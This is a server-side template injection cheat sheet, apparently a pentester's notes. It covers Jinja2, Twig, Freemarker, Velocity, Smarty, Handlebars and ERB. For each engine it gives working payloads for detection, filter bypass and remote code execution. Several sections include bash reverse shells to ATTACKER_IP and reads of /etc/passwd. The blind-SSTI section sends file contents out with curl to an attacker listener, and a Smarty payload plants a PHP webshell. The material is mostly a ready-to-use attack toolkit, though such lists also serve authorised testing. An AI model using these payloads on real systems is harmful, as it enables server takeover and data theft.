## Table of Contents:

- [[#Detection & Identification]]
- [[#Jinja2 (Python/Flask)]]
- [[#Twig (PHP)]]
- [[#Freemarker (Java)]]
- [[#Velocity (Java)]]
- [[#Smarty (PHP)]]
- [[#Handlebars (Node.js)]]
- [[#ERB (Ruby)]]
- [[#Blind SSTI]]

---

## Detection & Identification

#### Confirm reflection

```bash
# Send a plain string first confirm it reflects
curl "https://target.com/page?name=teststring"
# If teststring appears in response potential SSTI
```

#### Polyglot probe

```sh
# Sending this polyglot triggers errors across multiple engines
${{<%['"}}%\.
```

#### Identify the engine

```
{{7*7}} = 49           ### Jinja2 or Twig  
{{7*'7'}} = 49         ### Jinja2  
{{7*'7'}} = 7777777    ### Twig  
${7*7} = 49            ### Freemarker / Spring EL  
<%= 7*7 %> = 49        ### ERB (Ruby)  
#{7*7} = 49            ### Mako / Ruby
*{7*7} = 49            ### Spring
```

If Nothing works then try Smarty, Velocity, Handlebars

**Tips:**
- [ ] Find all user-controlled inputs that reflect in response
- [ ] Test URL params, form fields, HTTP headers, cookies, User-Agent
- [ ] Send polyglot probe first
- [ ] Confirm with math expression `{{7*7}}`
- [ ] Identify engine via differentiation payloads
- [ ] Check error messages, often reveal template engine name directly
- [ ] Try injecting into every parameter including ones that don't seem to reflect 

---

## Jinja2 (Python/Flask): `{{7*7}}`,`{{7*'7'}}` = 49

```python
# Confirm engine
{{7*'7'}}                    # → 49 (Jinja2) vs 7777777 (Twig)

# Basic info gathering
{{config}}                   # dump Flask config — may contain SECRET_KEY
{{config.items()}}
{{self.__dict__}}

# Code execution path: walk Python class hierarchy
# Step 1: get string object's class
{{''.__class__}}             # <class 'str'>

# Step 2: get base class (object)
{{''.__class__.__mro__}}     # (<class 'str'>, <class 'object'>)

# Step 3: get all subclasses of object
{{''.__class__.__mro__[1].__subclasses__()}}

# Step 4: find subprocess.Popen or os._wrap_close in subclass list
# Look for index of subprocess.Popen:
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Easier RCE path via __import__
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# RCE via request object (Flask specific)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# RCE: cleanest payload
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Filter bypass: if dots are filtered
{{''['__class__']['__mro__'][1]['__subclasses__']()}}

# Filter bypass: if underscores are filtered
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Reverse shell
{{''.__class__.__mro__[1].__subclasses__()[396]('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',shell=True,stdout=-1).communicate()}}
```

Enumerate all sub-classes and grep for `Popen` or `os` to find the right index

---

## Twig (PHP): `{{7*'7'}}` = 7777777

```php
# Confirm engine
{{7*'7'}}           # 7777777 (Twig) vs 49 (Jinja2)

# Basic info
{{_self}}
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

# RCE via filter
{{_self.env.setCache("ftp://attacker.com:1234")}}
{{_self.env.loadTemplate("backdoor")}}

# RCE via registerUndefinedFilterCallback
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# RCE: cleanest
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}

# RCE via map filter
{{['id', '']|sort('system')}}

# Reverse shell
{{['bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"']|filter('system')}}
```

---

## Freemarker (Java) - ${7*7} 

```java
# Confirm
${7*7}              # should give 49
#{7*7}              # should give 49

# Basic info
${.data_model}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# RCE alternative
${"freemarker.template.utility.Execute"?new()("id")}

# File read
${.data_model["userClass"].protectionDomain.codeSource.location.path}

# Reverse shell
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")}
```

---

## Velocity (Java)

```java
# Confirm
#set($x = 7*7)$x    # → 49

# RCE
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

## Smarty (PHP)

```php
# Confirm
{$smarty.version}   # returns version number

# Basic info
{php}echo `id`;{/php}          # older Smarty versions
{system('id')}                 # Smarty 3

# RCE
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# RCE via math
{math equation="system('id')"}
```

---

## Handlebars (Node.js)

```javascript
# Confirm
{{7*7}}             # may return 49 or blank

# RCE via prototype pollution path
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## ERB (Ruby on rails)

```ruby
# Confirm
<%= 7*7 %>          # → 49

# Basic info
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>

# File read
<%= File.read('/etc/passwd') %>

# RCE
<%= system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') %>

# Reverse shell via exec
<% require 'open3' %>
<% Open3.popen3('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1') %>
```

---

## Blind SSTI

```bash
# Time-based detection
# Jinja2: sleep via Python
{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}

# DNS/HTTP callback to confirm execution
# Jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('curl http://ATTACKER_IP:8000/ssti',shell=True,stdout=-1).communicate()}}

# Twig
{{['curl http://ATTACKER_IP:8000/ssti']|filter('system')}}

# Freemarker
${"freemarker.template.utility.Execute"?new()("curl http://ATTACKER_IP:8000/ssti")}

# Start listener to catch callback
python3 -m http.server 8000
# or
nc -lvnp 8000

# OOB data exfiltration: exfil file contents via curl
# Jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('curl -d @/etc/passwd http://ATTACKER_IP:8000',shell=True,stdout=-1).communicate()}}

# Twig
{{['curl -d @/etc/passwd http://ATTACKER_IP:8000']|filter('system')}}
```

**Tips:**
- [ ] Use time-based payloads to confirm blind execution
- [ ] Use DNS/HTTP callback to confirm out-of-band
- [ ] Exfiltrate files via curl POST to your listener
- [ ] Try writing a webshell to web root if you know the path
- [ ] Try writing a file to the web root and accessing it for RCE without outputs

---